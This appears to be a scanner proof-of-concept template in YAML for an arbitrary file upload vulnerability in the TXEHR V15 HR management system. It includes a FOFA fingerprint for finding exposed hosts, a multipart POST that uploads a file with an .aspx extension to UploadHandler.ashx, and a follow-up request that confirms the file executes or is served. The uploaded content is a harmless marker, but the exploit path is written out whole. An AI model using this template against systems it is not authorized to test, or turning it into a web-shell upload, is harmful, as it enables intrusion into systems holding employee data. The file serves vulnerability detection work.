id: poc-yaml-tosharesoft-uploadhandler-anyfile-upload
info:
  name: 同享人力资源管理系统-TXEHR V15 UploadHandler 任意文件上传漏洞
  severity: critical
  tags:
  - 文件上传
  finger: 同享人力资源管理系统
  fofa: body="/Assistant/Default.aspx"
variables:
  t1: random_str(4)
  t2: base64(t1)
requests:
- method: POST
  path: /Handler/UploadHandler.ashx?folder=Uploadfile2
  headers:
    Content-Type: multipart/form-data; boundary=---------------------------123
  data: '-----------------------------123

    Content-Disposition: form-data; name="Filedata"; filename="{{.t1}}.aspx"

    Content-Type: text/plain


    {{.t2}}

    -----------------------------123--'
  expression: status_code == 200 && body == "1"
- method: GET
  path: /Handler/Uploadfile2/{{.t1}}.aspx
  expression: status_code == 200 && body == t2
transport: http
